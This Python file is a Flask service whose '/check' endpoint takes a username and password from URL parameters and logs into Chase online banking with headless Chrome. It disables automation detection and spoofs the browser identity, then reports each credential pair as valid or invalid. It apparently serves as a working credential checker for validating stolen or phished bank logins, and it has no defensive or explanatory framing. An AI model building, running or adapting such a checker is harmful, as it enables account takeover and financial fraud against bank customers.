import os
import platform
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from flask import Flask, request, jsonify

app = Flask(__name__)

EXCEPT_FLAG = False

print ("Binary path: %s" % (os.environ.get("GOOGLE_CHROME_BIN")))
chrome_options = Options()
chrome_options.binary_location = os.environ.get("GOOGLE_CHROME_BIN")
chrome_options.add_argument("--headless")
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('--disable-blink-features=AutomationControlled')
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("window-size=1280,800")
chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.24 Safari/537.36")


@app.route("/check", methods=['GET']) 
def validate():
  print ("Driver path: %s" % (os.environ.get("CHROMEDRIVER_PATH")))
  global EXCEPT_FLAG
  driver = webdriver.Chrome(executable_path=os.environ.get(
                   "CHROMEDRIVER_PATH"), chrome_options = chrome_options)
  # WebDriver Path for System
  """if platform.system() == ('Windows'):
      try:
        driver = webdriver.Chrome(executable_path=os.environ.get(
                   "CHROMEDRIVER_PATH"), chrome_options = chrome_options)
      except Exception as e:
        print("Please download chrome driver executable at the right location %s" % e)
  elif platform.system() == ('Linux'):
      try:
        driver = webdriver.Chrome(executable_path=os.environ.get(
                   "CHROMEDRIVER_PATH"), chrome_options = chrome_options)
      except Exception as e:
        print("Please download chrome driver executable at the right location %s" % e)    
  elif platform.system() == ('Darwin'):
      try:
        driver = webdriver(executable_path=os.environ.get(
                   "CHROMEDRIVER_PATH"), chrome_options = chrome_options)
      except Exception as e:
        print("Please download driver executable at the right location %s" % e)    
  else:
      print("Unknown OS !")"""
    
  wait = WebDriverWait(driver, 40)  
  driver.maximize_window()
  driver.get("https://secure07b.chase.com")
  frame = wait.until(ec.visibility_of_element_located((By.XPATH, "/html/body/div[1]/iframe")))
  driver.switch_to.frame(frame)
  username = wait.until(ec.visibility_of_element_located((By.ID, "userId-text-input-field")))
  
  user = request.args["username"]
  username.send_keys(user)

  password = wait.until(ec.visibility_of_element_located((By.ID, "password-text-input-field")))
  pwd = request.args["password"]
  password.send_keys(pwd)

  sign_in = wait.until(ec.visibility_of_element_located((By.ID, "signin-button")))
  try:
    sign_in.click()
    time.sleep(2)
    if driver.find_element_by_id("inner-logon-error"):
      print (driver.find_element_by_id("inner-logon-error").text)
      if "We can't find that username" in driver.find_element_by_id("inner-logon-error").text:
        driver.close()
        response_object = {"username":user, "status": "invalid"}
        return response_object
  except Exception as ex:
    EXCEPT_FLAG = True
    print (str(ex))
  
  if EXCEPT_FLAG:
    try:
      if driver.find_element_by_class_name("u-no-outline"):
        print (driver.find_element_by_class_name("u-no-outline").text)
        if "It looks like this part of our site isn't working right now." in  driver.find_element_by_class_name("u-no-outline").text:
          driver.close()
          response_object = {"status": "invalid", "username":user}
          return response_object
    except Exception as ex:
      print (ex)
      driver.close()
      response_object = {"status": "invalid", "username":user}
      return response_object
  driver.close()
  response_object = {"username":user, "status": "valid"}
  return response_object

if __name__ == "__main__":
    app.run()
